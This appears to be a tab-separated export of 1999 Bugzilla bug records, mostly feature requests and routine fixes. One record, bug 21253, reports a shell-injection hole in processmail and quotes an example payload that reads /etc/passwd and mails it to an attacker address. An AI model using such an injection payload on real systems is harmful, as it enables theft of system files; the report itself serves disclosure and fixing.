10524%TAB%932988863%TAB%6071%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%typo in defparams.pl%TAB%typo in defparams.pl
11155%TAB%933629357%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Support bug flags.,Support bug flags/tags/radars,Anyone should be able to invent keywords!,Support bug flags/tags/radars/keywords.%TAB%Support bug flags.,Support bug flags/tags/radars,Anyone should be able to invent keywords!,Support bug flags/tags/radars/keywords.
11167%TAB%933671464%TAB%5304%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Unable to change several bugs at once to 'VERIFED' [Patch]%TAB%Unable to change several bugs at once to 'VERIFED' [Patch]
11223%TAB%933701662%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bug voting.%TAB%Bug voting.
11242%TAB%933733301%TAB%5304%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%A Mail is sent more than once to a person [Patch]%TAB%A Mail is sent more than once to a person [Patch]
11328%TAB%933809522%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Table-Based Query Screen,Created Advanced (More Than Now) & Basic Query Screens%TAB%Table-Based Query Screen,Created Advanced (More Than Now) & Basic Query Screens
11901%TAB%934598836%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Creating/Changing Bugs,User Interface%TAB%Change Bugzilla comments line-wrapping policy%TAB%Change Bugzilla comments line-wrapping policy
11929%TAB%934680295%TAB%4907%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Place bug template in Bugzilla forms.%TAB%Place bug template in Bugzilla forms.
12282%TAB%935262632%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Reporting/Charting%TAB%General summary reports.%TAB%General summary reports.
12284%TAB%935283279%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Column specification support.,let me specify which columns to display in a bug list%TAB%Column specification support.,let me specify which columns to display in a bug list
12285%TAB%935283460%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Ability to edit query behind a bug list.%TAB%Ability to edit query behind a bug list.
12309%TAB%935382669%TAB%4432%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Missing "Unix"-platform...,need "Platform: UNIX" and maybe also "OS: All UNIX",want "Software Platform:" posix, unix, win32, macos, x11, gtk, qt,Missing "Unix"-platform,Need to be able to choose all versions of an OS%TAB%Missing "Unix"-platform...,need "Platform: UNIX" and maybe also "OS: All UNIX",want "Software Platform:" posix, unix, win32, macos, x11, gtk, qt,Missing "Unix"-platform,Need to be able to choose all versions of an OS
12324%TAB%935404466%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla query page doesn't run selectProduct() on load%TAB%Bugzilla query page doesn't run selectProduct() on load
12577%TAB%935682315%TAB%6531%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Invalid HTML / Don't use GET%TAB%Invalid HTML / Don't use GET
12583%TAB%935684815%TAB%4681%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla does not handle restricted bugs very well.,Milestone Plan CGI script does not handle restricted bugs very well.%TAB%Bugzilla does not handle restricted bugs very well.,Milestone Plan CGI script does not handle restricted bugs very well.
12819%TAB%936019280%TAB%3853%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add cc field to bulk change on bugs.,Add/remove cc field to bulk change on bugs.%TAB%Add cc field to bulk change on bugs.,Add/remove cc field to bulk change on bugs.
13075%TAB%936297036%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Quip maintenance%TAB%Quip maintenance
13324%TAB%936775054%TAB%5455%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Dependency graphs don't work in Bugzilla%TAB%Dependency graphs don't work in Bugzilla
13534%TAB%936898405%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Administration%TAB%REMIND and LATER considered harmful.%TAB%REMIND and LATER considered harmful.
13540%TAB%936914224%TAB%5151%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Usage of "bug" would serve better as "report" in many cases,Bugzilla should be more generic, adaptable, and customizable,[HELP WANTED] Bugzilla should be more generic, adaptable, and customizable,Bugzilla should be more generic, adaptable, and customizable%TAB%Usage of "bug" would serve better as "report" in many cases,Bugzilla should be more generic, adaptable, and customizable,[HELP WANTED] Bugzilla should be more generic, adaptable, and customizable,Bugzilla should be more generic, adaptable, and customizable
13626%TAB%937109325%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%loaded query doesn't show "Sort By" correctly.%TAB%loaded query doesn't show "Sort By" correctly.
14169%TAB%937562177%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%View bug activity shows QAC numbers rather than names%TAB%View bug activity shows QAC numbers rather than names
14461%TAB%937914742%TAB%4019%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Administration%TAB%Can't delete a QA contact from edit components%TAB%Can't delete a QA contact from edit components
14529%TAB%937934167%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Send notifications based on union of notifiers before and after change.%TAB%Send notifications based on union of notifiers before and after change.
14858%TAB%938167987%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%cc QA Contact when a bug is set to FIXED%TAB%cc QA Contact when a bug is set to FIXED
14887%TAB%938181195%TAB%2365%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%HTML form controls,bugzilla should use <label> tag in forms%TAB%HTML form controls,bugzilla should use <label> tag in forms
15083%TAB%938509012%TAB%302291%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%depends and depending verbage not destinctive enough%TAB%depends and depending verbage not destinctive enough
15193%TAB%938604663%TAB%5051%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Patch: New GD Perl module will not produce .GIF charts.%TAB%Patch: New GD Perl module will not produce .GIF charts.
15808%TAB%939321019%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Can't execute personal query.%TAB%Can't execute personal query.
15809%TAB%939322290%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%Query.cgi/Buglist.cgi URL optimisation,Query.cgi/Buglist.cgi URL optimization,buglist.cgi URL character length optimization%TAB%Query.cgi/Buglist.cgi URL optimisation,Query.cgi/Buglist.cgi URL optimization,buglist.cgi URL character length optimization
15811%TAB%939322504%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Votes capability on query page.%TAB%Votes capability on query page.
15890%TAB%939393611%TAB%1869%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Query for fixed bugs by resolution date no longer works%TAB%Query for fixed bugs by resolution date no longer works
15940%TAB%939460384%TAB%1749%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Sort by votes should sort descending instead of ascending%TAB%Sort by votes should sort descending instead of ascending
15945%TAB%939463428%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Interaction between voting and dependencies in sending email%TAB%Interaction between voting and dependencies in sending email
15966%TAB%939493421%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%CC list is a set, not an unordered list.%TAB%CC list is a set, not an unordered list.
15980%TAB%939517103%TAB%6349%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Password shown in the Location-bar,Password shown in the Location-bar and in html%TAB%Password shown in the Location-bar,Password shown in the Location-bar and in html
16000%TAB%939550564%TAB%7502%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%new users all unable to login: profiles.cryptpassword is NULL%TAB%new users all unable to login: profiles.cryptpassword is NULL
16009%TAB%939570413%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Reporting/Charting%TAB%General summary charts%TAB%General summary charts
16016%TAB%939577313%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Votes field gives wrong value in bug lists.%TAB%Votes field gives wrong value in bug lists.
16029%TAB%939593918%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Win 98 not auto recognised.%TAB%Win 98 not auto recognised.
16150%TAB%939669979%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Voting changes last changed date.%TAB%Voting changes last changed date.
16237%TAB%939738822%TAB%22599%TAB%CLOSED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Enhanced user management,Store author of comment seems as user id,Store author of comment as user id%TAB%Enhanced user management,Store author of comment seems as user id,Store author of comment as user id
16363%TAB%939828324%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Would like to sort Status Whiteboard Column%TAB%Would like to sort Status Whiteboard Column
16401%TAB%939873967%TAB%7653%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl error for first-time user%TAB%checksetup.pl error for first-time user
16436%TAB%939898602%TAB%7672%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Product and version field sizes in bugs table can cause truncation.%TAB%Product and version field sizes in bugs table can cause truncation.
16454%TAB%939904562%TAB%7675%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl can't handle database with password%TAB%checksetup.pl can't handle database with password
16775%TAB%940317433%TAB%7677%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Query confusing for newbies,[RFE] optional simplified version of query.cgi,Optional simplified query interface (query.cgi)%TAB%Query confusing for newbies,[RFE] optional simplified version of query.cgi,Optional simplified query interface (query.cgi)
17156%TAB%940778510%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to say bug.moz.org is for 5.x only.%TAB%Need to say bug.moz.org is for 5.x only.
17193%TAB%940852426%TAB%5300%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Uncaught exception in checksetup.pl%TAB%Uncaught exception in checksetup.pl
17286%TAB%940944173%TAB%1584%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Need product-specific target fix version%TAB%Need product-specific target fix version
17304%TAB%940955480%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Testing QA contact send on fixed.%TAB%Testing QA contact send on fixed.
17453%TAB%941089647%TAB%8002%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Enumerators and Long-term use of Bugzilla,Enumerators in Bugzilla are not cross-DB compatible%TAB%Enumerators and Long-term use of Bugzilla,Enumerators in Bugzilla are not cross-DB compatible
17464%TAB%941101332%TAB%3858%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%indicate closed bugs in mail messages,user preferences for notification mail%TAB%indicate closed bugs in mail messages,user preferences for notification mail
17773%TAB%941536341%TAB%8081%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%First user should be made superuser,Checksetup.pl should create maintainer if database is empty.%TAB%First user should be made superuser,Checksetup.pl should create maintainer if database is empty.
17779%TAB%941537031%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Testzilla,Bugzilla,Bugzilla-General%TAB%Create a new testzilla account page - submit button shows "submit query",Create a new account page - submit button shows "submit query"%TAB%Create a new testzilla account page - submit button shows "submit query",Create a new account page - submit button shows "submit query"
17827%TAB%941555700%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%dependency reports wrong,dependency reports misuse the word "closed".%TAB%dependency reports wrong,dependency reports misuse the word "closed".
18325%TAB%942134842%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bug Writing Guidelines plugs should use more direct language%TAB%Bug Writing Guidelines plugs should use more direct language
18349%TAB%942147180%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%problems loading remembered query with --- for TM,query.cgi target_milestone value does not reload form SELECTED item%TAB%problems loading remembered query with --- for TM,query.cgi target_milestone value does not reload form SELECTED itemIf a remembered query has the target milestone as blank "---" (not nothing selected, but the last item selected), then when it is *loaded* (not run), it shows up incorrectly.  The Target Milestone select box has, at the bottom, an extra option, which is the Component of that query, selected.  TO REPRODUCE:  * create a named query with      + Target Milestone = "---"      + Component = "Browser-General"  * do "load the remembered query" on that query  * the select for Target Milestone has an extra option at the bottom, "Browser-General", and it's selected, so the query doesn't work unless you change the TM!  (Using NN 4.61 Linux.)
19006%TAB%942762927%TAB%3822%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%RFE: Bug pages should have "look up bug #[   ]" entry field.%TAB%RFE: Bug pages should have "look up bug #[   ]" entry field.This is the biggest productivity block relating to bugzilla that I have anymore.  When I've just changed one bug and gotten the resulting page back I usually don't want to operate on whatever the next bug bugzilla showed me is. Most times I need to skip around to bugs that wouldn't easily fit in a single query.  If each bug page simply had the text entry field allowing me to specify the next bug I want to go to, this would save me a LOT of time.
19346%TAB%942999856%TAB%6303%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Miscellaneous,Bugzilla,Bugzilla-General%TAB%Time to add Win 2000 to list of OS in Bugzilla%TAB%Time to add Win 2000 to list of OS in BugzillaOverview: Windows 2000 does not appear on the list of possible OS to specify in a bug report. As it involves enough re-architecting that bugs reported on this OS could conceivably be due to a change in either API implementation or adherence to APIs on the OS end, rather than to anything wrong with Mozilla, capturing this data seems important.  Bug 18400, "MacOS 9 is out" should be seen to at the same time.  If bug 17453 "Enumerators and Long-term use of Bugzilla" is going to get attention, this may be the time, and while checking to make sure that the new OS are showing up properly may be the time to see to bug 16029, "Win 98 not auto recognised".  While those choosing to use the Windows 2000 betas are admittedly not the most likely to be using Bugzilla, soon it will be time to test on it regardless.
19910%TAB%943305999%TAB%4019%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bugzilla eats other bugzilla's cookies,One Bugzilla eats other Bugzilla's cookies on same server%TAB%Bugzilla eats other bugzilla's cookies,One Bugzilla eats other Bugzilla's cookies on same serverThe real problem here is that bugzilla uses a path of '/' for its cookie and  uses a statis name for the cookie.  It should really use a cookie name that is  dependend upon the name of the database and a path that is based upon its  location in the web tree.  Otherwise, if you have several bugzilla installations  on a single server, the cookies will stomp upon one another.
20006%TAB%943381517%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bad assignee on bug report.%TAB%Bad assignee on bug report.Currently bug #19459 has an assignee of "__UNKNOWN__", at least that's the way it appears to me.
20050%TAB%943439969%TAB%7868%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%M11 can't handle bugzilla front page%TAB%M11 can't handle bugzilla front pageas of Wed Nov 24 14:34:00 EST 1999, i can't enter this bug report from mozilla, because M11 (Build ID: 19999111520) on NT and Solaris can't follow any of the links on left side of the bugzilla homepage.  There is a javascript link to "Show Mozilla bug no." and it has overflowed to consume all of the links on the left side of the page (above the ant), which include the "Enter a new bug report" link. *d'oh*  I can see the page without difficulty in NN 4.5.  It's not a JavaScript bug. It's an HTML bug, and it's my fault. I incorrectly nested HTML tags in the new page, which stuffed the links. (I rand it through an HTML validator, but the validator doesn't check HTML tags hidden in JavaScript, you see.)  I noted this in bug 16546 -- there's a fixed version attached to that bug, waiting to be checked in. CCing endico and terry, because they were the ones involved in getting the new page up in the first place.  Apologies for the inconvenience, but I've now supplied the fix and it's up to terry and co. to put it up ASAP.
20122%TAB%943617683%TAB%3881%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Accounts%TAB%Bugzilla requires new login everytime hostname changes,Bugzilla requires new login every time hostname changes,Bugzilla requires new login every time hostname changes (ip address),Bugzilla requires new login if IP changes or cookies off,Bugzilla requires new login if IP changes%TAB%Bugzilla requires new login everytime hostname changes,Bugzilla requires new login every time hostname changes,Bugzilla requires new login every time hostname changes (ip address),Bugzilla requires new login if IP changes or cookies off,Bugzilla requires new login if IP changesBugzilla requires that I login again every time my hostname changes, even if I'm on the same computer.  This is very annoying when on a dialup (and people on a LAN don't notice the problem).  Could this be changed?  The cause seems to be in quietly_check_login in http://lxr.mozilla.org/mozilla/source/webtools/bugzilla/CGI.pl , where SendSQL is called.
20126%TAB%943627339%TAB%5168%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%date and time in show_bug.cgi%TAB%date and time in show_bug.cgiThe "Additional Comments" lines have a U.S. date format (MM/DD/YY). Please use ISO International Standard format which is YYYY-MM-DD  Also, after the "Opened:" date add the time it was opened.  Thanks.
20392%TAB%943973103%TAB%4833%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Reporting/Charting%TAB%Suggestion: a chart showing the number of bug reporters on bugzilla%TAB%Suggestion: a chart showing the number of bug reporters on bugzillaIn addition to the current bug charts: A chart that tracks:                    the number of bug reporters,                    how many bugs are marked invalid,                    how many bugs are marked duplicate,                    how many bugs are enhancements,                    how many bugs are trivial...etc.                    bugs reported on MacOS, Win32, Linux...                    bugs reported on PC, DEC, Mac, SGI...                    the number of bug reporter that uses IE,Nav,Moz,Opera...
20461%TAB%944028918%TAB%8667%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%xyzzy in bugs cols in editversions.cgi when no bugs have been entered%TAB%xyzzy in bugs cols in editversions.cgi when no bugs have been enteredI have installed bugzilla, and am configuring it. At the moment there are no bugs entered yet into Bugzilla.  When I load up the editversions.cgi script in my browser a table with 3 columns appears. The cols are             Edit versions of ... | Description | Bugs  the problem is that every entry in the Bugs column contains the string 'xyzzy'.
20563%TAB%944082831%TAB%1537%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%check of group bits in buglist.cgi permits null string%TAB%check of group bits in buglist.cgi permits null stringWhen we first stumbled across bug 20562, it was in part because of another bug which can cause invalid sql to be generated if zero bugs are found while attempting to do multiple changes.  The fix, I think is to change line 759 of buglist.cgi:  if ($::usergroupset ne '0' && $buggroupset =~ /^\d*$/) {  \d* should really be \d+
20673%TAB%944165479%TAB%567%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Mid-air collision when bad email address in CC list%TAB%Mid-air collision when bad email address in CC listTo reproduce: Go to an exising bug (like this one). Add a non-existent email address to the CC list, and type something in the description field. Submit the bug. You get the 'bad email address' page. Go back, and correct the email address in the CC field that you entered. Submit again. Now you get the mid-air collision page. This should not happen.
20676%TAB%944178195%TAB%8920%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%product/program name length limitation%TAB%product/program name length limitationThere seems be be a disconnect in the sizes of the BUGS.PRODUCT and PROGRAM.PROGRAM fields in the DB. B/c of this, one can create a product/program that seems valid b/c it fits into the PROGRAM table but breaks all queries b/c it doesn't match anything in the BUGS table.
20768%TAB%944233986%TAB%4019%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Request: Reassign and reopen in one step%TAB%Request: Reassign and reopen in one stepoften when i reopen a bug i want to assign it to someone immediately.  it would be nice if i could do that as part of the reopen process.
20841%TAB%944384495%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%should send email to union of old and new lists%TAB%should send email to union of old and new listsWhen the lists of who recieves email notifications on a bug changes, it would be good if the email went to anyone who was on either the old or the new list. This would inform people when:  * they are taken off the cc: list  * someone else assigns (or QA-assigns) the bug to himself and doesn't cc: the old owner  This will help prevent accidental confusion and also malicious use of Bugzilla to mess up people working on Mozilla.  (See morse's comments on bug 20477.  I've actually thought about this before, but never (I think) filed it...)
21080%TAB%944575078%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need query for activity on bugs%TAB%Need query for activity on bugsWould like a way to query for bugs that have had no activity in a certain amount of time?  For example, if I wanted to look at PDT+ bugs that have had no activity in the last week.  Or from day A to day B...  This would help me keep an eye on hot bugs not moving during critical milestones.  Thanks!
21145%TAB%944626387%TAB%3879%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%MM/DD/YY date format confusing to non-americans.%TAB%MM/DD/YY date format confusing to non-americans.In the interests of international understanding, I would like the request that Bugzilla's on-page date representation be changed to the very considerably less internationally-ambiguous YYYY-MM-DD  Thankee!
21253%TAB%944683465%TAB%1537%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%processmail-related security holes in bugzilla,remove single-parameter system() calls from Bugzilla%TAB%processmail-related security holes in bugzilla,remove single-parameter system() calls from BugzillaThe processmail script is called using system().  Almost every call of processmail puts unchecked values from the CGI forms in the command-line that's given to the shell.  This means that people can execute arbitrary commands by embedding shell meta-characters (eg `cat /etc/passwd | mail cracker@badboyz.org`) in CGI form variables.  Ways to fix this include either making processmail take this information from stdin, or carefully stripping shell metachars out of the command line, or giving up on system() and doing the fork/exec directly.
21427%TAB%944832656%TAB%1672%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%UI: "Query Page" doesn't show up in index.html%TAB%UI: "Query Page" doesn't show up in index.htmlMost of bugzilla refers to the query page as "Query Page", but index.html (top level bugzilla) now has "Search existing bug reports". This is confusing for me, I'm hunting for "Query" out of long-time habit and/or consistancy's sake.  Suggest "Query Page (Search for existing bug reports)"?
21583%TAB%945074260%TAB%6454%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%[RFE] Buzilla attachments should say what kind of file they are%TAB%[RFE] Buzilla attachments should say what kind of file they areWhen an attachment has a description like "test case", it is impossible to figure out what kind of file it is without clicking it. Would be nice if it included the MIME type or file extension next to each attachment.
21745%TAB%945179479%TAB%5003%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[bugday] bugzilla query page needs a field for actual bug number%TAB%[bugday] bugzilla query page needs a field for actual bug numberIt would be a time saver if there was a field at the very top or bottom of the query page that said "If you already know the bug # type it here:" or something like that.  I know this is available on the main Bugzilla page but it would save time if it was also available on the query page.
22006%TAB%945361352%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%bug 15445 is non existent?%TAB%bug 15445 is non existent?Holy crap.  I have discovered the bug that caused this bug (and probably several others) to disappear.  I have fixed that bug, so no more bugs should be mysteriously vanishing.  Next, I will work on a way to restore these deleted bugs from backups.  I do have good backups, but they're not designed to selectively restore individual bugs.  This is going to be a pain.
22041%TAB%945421169%TAB%7279%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Useful Titles for Bugs.,Bug page TITLE should include bug summary%TAB%Useful Titles for Bugs.,Bug page TITLE should include bug summaryWhen I bookmark a bug, all I get is the bug number. It would be useful if the title could be the summary or possibly a new field that is editable.
22091%TAB%945444397%TAB%3881%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%enhancements to bugzilla email diffs,Direct new users how to respond to bugmails.%TAB%enhancements to bugzilla email diffs,Direct new users how to respond to bugmails.Instead of just giving the URL of the bug at the top of the email diffs it sends, it would be nice if it gave a little more information.  The thing I want to know the most is who changed the bug, and this isn't clear when they don't comment.  It would also be good for new users if the text around the URL told them comments should be sent there (rather than by email).  I'm tired of getting replies to comments on bugs by email.  That is, where the email report currently says something like:  http://bugzilla.mozilla.org/show_bug.cgi?id=2357  it would be nice if it said:  Bug 2357 was changed by dbaron@fas.harvard.edu .  To respond to these changes, go to http://bugzilla.mozilla.org/show_bug.cgi?id=2357 .  This requires, I think, only a few simple changes, in two places.  In processmail, it would be nice to change $nametoexclude to $whochanged or something more descriptive, but anyway...  In processmail, around line 315, you could add $substs{"whochanged"} = $nametoexclude;  And then in defparams.pl, at line 208, you could change  %urlbase%show_bug.cgi?id=%bugid%  to  Bug %bugid% was changed by %whochanged% .  To respond to these changes, go to %urlbase%show_bug.cgi?id=%bugid% .  That looks like it'll work, anyway.  I don't really want to figure out how to install bugzilla to see for myself, since it doesn't look easy.
22220%TAB%945697130%TAB%5003%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%check box for tracking and meta bugs,Need to be able to query for bugs that *don't* have a given keyword.%TAB%check box for tracking and meta bugs,Need to be able to query for bugs that *don't* have a given keyword.It would be extremely useful to have a check box for all tracking and other meta bugs.  When creating a meta bug the box could be checked.  Queries could exclude these 'not really a bug' bugs.  This would give us bug stats and charts that more closely reflect bug realities.
22353%TAB%945799161%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Duplicate bug detection.,Duplicate bug detection,Automatic duplicate bug detection%TAB%Duplicate bug detection.,Duplicate bug detection,Automatic duplicate bug detectionIt would be good for someone interested in AI to try and determine whether a bug report has duplicate bugs in the database.  I'm thinking you could look at reports for common fragments, a lot of words in common, and possibly os/platform/product/component.  Firstly, it could run in the background and generate a report on existing bugs for someone to look at (obviously it wouldn't generate the same combination again if it could, but this probably implies upper limit n squared space).  Secondly, it could be used at report time to prevent the bugs being reported. It would display a list of bugs that could possibly be duplicates.  The false positive count would have to be low though, such that most of the time you wouldn't get this screen.  This is to prevent annoyance, as well as any "I don't need to search, I'll just let the dupe checker find it for me" attitude.  Obviously the second option would need to be quite quick, which probably involves precomputed information.  While being developed, possible duplicates on the entered bug report could be logged rather than displayed to the user, so the false positive level could be monitored while the checker is tweaked to give an acceptable false positive ratio.
22855%TAB%946600262%TAB%22599%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%CC on remove%TAB%CC on removeIf somebody takes a bug from me (assignes it to someone else) and doesn't add me to cc (and I'm not otherwise in the to/cc list), I don't even notice.  Notify me, if I'm removed from the to/cc list in any way.
22911%TAB%946880617%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%When Zarro Boogs found there should be a Add new bug link%TAB%When Zarro Boogs found there should be a Add new bug linkSince you didnøt find any bugs the possibilities that you want to add a new bug are big. Please add: print "<br><a href=\"enter_bug.cgi\">Create a new bug.</a><br>\n"; after line 658 in buglist.cgi
23067%TAB%946999805%TAB%6862%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Accounts%TAB%Should have some way to change the email account%TAB%Should have some way to change the email accountFor those of us who switch email accounts on at least a semi-regular basis (like, from home to school, from work to home, etc.), some way to change the email address associated with a particular Bugzilla account would be exceedingly helpful.  (Or, even more ideally, allow for generic user accounts from which a person could add an arbitrary amount of email addresses as aliases to the one user, but I'd love to at least have the ability to switch the associated email address for an account.)
